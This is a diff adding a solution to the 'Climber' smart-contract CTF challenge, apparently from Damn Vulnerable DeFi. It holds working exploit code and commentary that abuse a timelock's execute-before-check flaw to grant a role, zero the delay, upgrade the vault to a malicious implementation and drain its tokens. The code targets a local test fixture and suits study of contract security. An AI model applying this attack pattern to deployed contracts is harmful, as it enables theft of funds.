@@ -51,8 +51,101 @@ describe('[Challenge] Climber', function () {
         await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {
+      /**
+       * @dev
+       * The TimeLock contract's execute() function does not respect the Check-Effects-Interaction pattern: it checks if an action is ready for execution after executing it (l.104 - 108).
+       *    This allows us to bypass the waiting delay between scheduling and executing an      action: we can schedule an action, execute it, and include a call to updateDelay() in the execution to set it to 0, to pass the check line 108.
+       *    The execute() function's visibility modifier is 'external', meaning anyone - i.e the attacker - can call it.
+       *Now, what are the actions that need to be executed to empty the vault?
+       *    -set our attacker contract as a PROPOSER of the Timelock, to be able to schedule an action -> call the grantRole() function from the Timelock contract(to pass the onlyRole modifier check)
+       *    -update the timelock delay: set it as 0 to pass the check line 108. -> call updateDelay() from the Timelock contract
+       *    -sweep all the funds.
+       * The final problem is: how to call sweepFunds()? it can only be called by the sweeper, which can only be set internally.
+       * -> ClimberVault is the Implementation contract following the UUPS pattern)
+       * We can upgrade this implementation contract to a new one where setSweeper is does not have the onlySweeper modifier and can hence be called by anyone
+       *
+       * All these actions will need to be called from our attacking contract - schedule() is an external function and cannot be called from the Timelock contarct itself.
+       * */
+
+      const AttackContractFactory = await ethers.getContractFactory(
+        'AttackTimelock',
+        attacker
+      );
+      const attackContract = await AttackContractFactory.deploy(
+        this.vault.address,
+        this.timelock.address,
+        this.token.address,
+        attacker.address
+      );
+
+
+      const ClimberVaultV2Factory = await ethers.getContractFactory(
+        'ClimberVaultV2',
+        attacker
+      );
+      const climberVaultV2Contract = await ClimberVaultV2Factory.deploy();
+
+      const PROPOSER_ROLE = ethers.utils.keccak256(
+        ethers.utils.toUtf8Bytes('PROPOSER_ROLE')
+      );
+
+      //Encode all the actions
+      //Set attacker contract as proposer for timelock
+      const interfaceSetupRole = new ethers.utils.Interface([
+        'function grantRole(bytes32 role, address account)',
+      ]);
+      const grantRoleData = interfaceSetupRole.encodeFunctionData('grantRole', [
+        PROPOSER_ROLE,
+        attackContract.address,
+      ]);
+
+      // Set timelock delay to 0
+      const interfaceUpdateDelay = new ethers.utils.Interface([
+        'function updateDelay(uint64 newDelay)',
+      ]);
+      const updateDelayData = interfaceUpdateDelay.encodeFunctionData(
+        'updateDelay',
+        [0]
+      );
+
+      // upgrade the implementation contract to our malicious climber vault
+      const interfaceUpgrade = new ethers.utils.Interface([
+        'function upgradeTo(address newImplementation)',
+      ]);
+      const upgradeData = interfaceUpgrade.encodeFunctionData('upgradeTo', [
+        climberVaultV2Contract.address,
+      ]);
+
+      // call our attack() function that will schedule the actions and sweep the funds.
+      const interfaceAttack = new ethers.utils.Interface(['function attack()']);
+      const attackData = interfaceAttack.encodeFunctionData(
+        'attack'
+      );
+
+      const dataAddress = [
+        this.timelock.address,
+        this.timelock.address,
+        this.vault.address,
+        attackContract.address,
+      ];
+      const data = [grantRoleData, updateDelayData, upgradeData, attackData];
+
+      // Pass all the encoded actions as the calldata fpr our attack
+      await attackContract.setCallData(dataAddress, data);
+
+      await this.timelock
+        .connect(attacker)
+        .execute(
+          dataAddress,
+          Array(data.length).fill(0),
+          data,
+          ethers.utils.hexZeroPad('0x0', 32)
+        );
+
+      await attackContract.withdrawToAttacker();
+
+      /** CODE YOUR EXPLOIT HERE */
     });
 
     after(async function () {
